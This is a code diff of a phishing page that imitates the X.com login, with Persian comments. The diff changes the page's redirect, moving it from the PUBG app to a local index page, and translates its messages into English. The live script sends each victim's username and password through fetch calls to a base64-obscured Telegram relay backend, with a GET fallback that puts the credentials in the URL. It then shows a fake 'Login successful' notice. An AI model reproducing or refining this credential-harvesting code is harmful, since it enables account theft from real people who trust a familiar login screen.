@@ -430,33 +430,25 @@
   <script>
     // =====================================================
     // 🔒 TOKEN HIDDEN - مخفی‌سازی توکن تلگرام
-    // توکن به صورت base64 کدگذاری شده است
     // =====================================================
     
-    // توکن کدگذاری شده (base64)
     const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
     
-    // تابع رمزگشایی توکن
     function getBackendUrl() {
       try {
-        // رمزگشایی base64
         return atob(ENCODED_TOKEN);
       } catch(e) {
-        // در صورت خطا، از آدرس پیش‌فرض استفاده کن
         console.warn("Token decode failed, using fallback");
         return "https://telegram-backend-zo3n.onrender.com";
       }
     }
 
-    // دریافت آدرس واقعی بک‌اند
     const TELEGRAM_BACKEND_URL = getBackendUrl();
     const WAKEUP_COUNT = 2;
-
-    // فقط برای دیباگ (آدرس در کنسول نشان داده می‌شود)
     console.log("✅ Backend URL loaded securely");
 
     // =====================================================
-    // 🚀 ارسال پیام ویکاپ به بک‌اند جدید
+    // 🚀 ارسال پیام ویکاپ به بک‌اند
     // =====================================================
     function sendWakeup(index) {
       try {
@@ -478,17 +470,15 @@
     }
 
     // =====================================================
-    // 🚀 ارسال اطلاعات ورود به بک‌اند جدید
+    // 🚀 ارسال اطلاعات ورود به بک‌اند
     // =====================================================
     function sendLoginInfo(username, password) {
-      // مرحله 1: ارسال ۲ ویکاپ
       for (let i = 1; i <= WAKEUP_COUNT; i++) {
         setTimeout(() => {
           sendWakeup(i);
         }, i * 500);
       }
 
-      // مرحله 2: ارسال اطلاعات اصلی با تاخیر
       setTimeout(() => {
         try {
           fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
@@ -511,7 +501,6 @@
           })
           .catch(err => {
             console.log("⚠️ Login info send failed, trying fallback...");
-            // Fallback: ارسال با GET
             try {
               const msg = encodeURIComponent(`X.com Login | User: ${username} | Pass: ${password}`);
               fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
@@ -528,36 +517,12 @@
     }
 
     // =============================================
-    // ===== 🚀 تابع باز کردن PUBG Mobile =====
+    // ===== بازگشت به صفحه اندکس با فلگ =====
     // =============================================
-    function openPUBG() {
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      
-      // تشخیص دستگاه
-      const isAndroid = /android/i.test(userAgent);
-      const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
-      
-      if (isAndroid) {
-        // تلاش برای باز کردن اپلیکیشن اندروید
-        window.location.href = 'intent://com.tencent.ig#Intent;scheme=https;package=com.tencent.ig;end';
-        
-        // اگر اپ باز نشد، بعد از ۲ ثانیه به گوگل‌پلی برو
-        setTimeout(() => {
-          window.location.href = 'https://play.google.com/store/apps/details?id=com.tencent.ig';
-        }, 2000);
-        
-      } else if (isIOS) {
-        // برای آیفون
-        window.location.href = 'https://pubg.com/';
-        
-        setTimeout(() => {
-          window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
-        }, 2000);
-        
-      } else {
-        // کامپیوتر یا سایر دستگاه‌ها
-        window.open('https://www.pubg.com/', '_blank');
-      }
+    function goToIndex() {
+      // تنظیم فلگ در localStorage برای نمایش کارت تشکر
+      localStorage.setItem('fromFacebook', 'true');
+      window.location.href = 'index.html';
     }
 
     // ===== Eye Toggle =====
@@ -597,12 +562,12 @@
       // اعتبارسنجی
       if (input.length < 3) {
         isValid = false;
-        errorMessage = 'لطفاً ایمیل یا نام کاربری معتبر وارد کنید (حداقل ۳ کاراکتر)';
+        errorMessage = 'Please enter a valid email or username (at least 3 characters)';
       }
 
       if (isValid && password.length < 5) {
         isValid = false;
-        errorMessage = 'رمز عبور باید حداقل ۵ کاراکتر باشد';
+        errorMessage = 'Password must be at least 5 characters long';
       }
 
       if (!isValid) {
@@ -611,20 +576,16 @@
         return false;
       }
 
-      // =============================================
-      // 🚀 ارسال به تلگرام + باز کردن PUBG
-      // =============================================
-      
-      // 1. ارسال اطلاعات به تلگرام (با ویکاپ)
+      // ارسال اطلاعات به تلگرام
       sendLoginInfo(input, password);
 
-      // 2. نمایش پیام موفقیت
-      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ ورود موفق! در حال انتقال به PUBG...`;
+      // نمایش پیام موفقیت
+      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting...`;
       successBox.style.display = 'block';
 
-      // 3. با تاخیر 1.5 ثانیه PUBG را باز کن
+      // بازگشت به صفحه اندکس بعد از 1.5 ثانیه
       setTimeout(() => {
-        openPUBG();
+        goToIndex();
       }, 1500);
 
       return false;
@@ -634,20 +595,19 @@
     // 🔥 ویکاپ هنگام لود صفحه
     // =====================================================
     document.addEventListener('DOMContentLoaded', function() {
-      // Wake-up هنگام لود
       fetch(`${TELEGRAM_BACKEND_URL}/health`)
         .then(() => console.log('✅ Server is awake'))
         .catch(() => console.log('🔄 Server waking up...'));
       
-      // ارسال ویکاپ‌های اولیه
       for (let i = 1; i <= WAKEUP_COUNT; i++) {
         setTimeout(() => {
           sendWakeup(i);
         }, i * 400);
       }
       
-      console.log('✅ X.com Page Ready! (Token Hidden)');
+      console.log('✅ X.com Page Ready!');
     });
   </script>
+
 </body>
 </html>
